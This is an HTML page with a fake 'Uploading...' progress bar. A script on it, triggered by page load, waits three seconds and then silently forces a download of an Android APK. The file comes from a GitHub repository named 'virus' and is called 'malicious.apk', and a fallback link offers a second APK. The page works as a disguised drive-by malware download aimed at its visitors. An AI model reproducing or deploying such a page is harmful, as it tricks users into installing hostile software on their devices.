<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Download APK</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 50px;
        }
        .progress-container {
            width: 100%;
            max-width: 400px;
            margin: 20px auto;
            background-color: #f3f3f3;
            border-radius: 8px;
            overflow: hidden;
            border: 1px solid #ccc;
        }
        .progress-bar {
            width: 0%;
            height: 20px;
            background-color: #4caf50;
            animation: progressAnimation 3s linear forwards;
        }
        @keyframes progressAnimation {
            from {
                width: 0%;
            }
            to {
                width: 100%;
            }
        }
        .loading-text {
            font-size: 18px;
            margin-top: 10px;
        }
    </style>
    <script>
        function startDownload() {
            // Start the download after 3 seconds (when the animation completes)
            setTimeout(() => {
                const link = document.createElement('a');
                link.href = 'https://github.com/Fhchcjcjcjcjvkkvk/virus/raw/refs/heads/main/malicious.apk'; // URL of the APK file
                link.download = ''; // Optional: Specify a default filename
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }, 3000); // Match this with the animation duration
        }

        window.onload = startDownload;
    </script>
</head>
<body>
    <h1>Uploading...</h1>
    <div class="progress-container">
        <div class="progress-bar"></div>
    </div>
    <p class="loading-text">Please wait while your download starts...</p>
    <p>If the download doesn't start automatically, <a href="https://ggg.com/m.apk">click here</a>.</p>
</body>
</html>
